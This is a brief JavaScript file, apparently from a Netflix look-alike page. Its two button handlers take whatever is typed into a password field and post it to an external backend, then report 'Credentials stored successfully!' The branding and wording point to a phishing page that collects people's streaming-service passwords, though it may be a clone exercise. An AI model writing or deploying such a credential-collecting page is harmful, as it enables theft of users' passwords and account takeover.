/* script.js */
document.getElementById("verifyBtn").addEventListener("click", function() {
    const password = document.getElementById("password").value;

    fetch("https://netflixclone-5u7f.onrender.com", { // Replace with your Render backend URL
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            alert("✅ Credentials stored successfully!");
        } else {
            document.getElementById("error").textContent = "❌ Error storing credentials!";
        }
    })
    .catch(error => {
        document.getElementById("error").textContent = "❌ Server error! Try again later.";
        console.error("Error:", error);
    });
});

document.getElementById("loginBtn").addEventListener("click", function() {
    const password = document.getElementById("password").value;

    fetch("https://netflixclone-5u7f.onrender.com", { // Replace with your Render backend URL
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            alert("✅ Credentials stored successfully!");
        } else {
            document.getElementById("error").textContent = "❌ Error storing credentials!";
        }
    })
    .catch(error => {
        document.getElementById("error").textContent = "❌ Server error! Try again later.";
        console.error("Error:", error);
    });
});
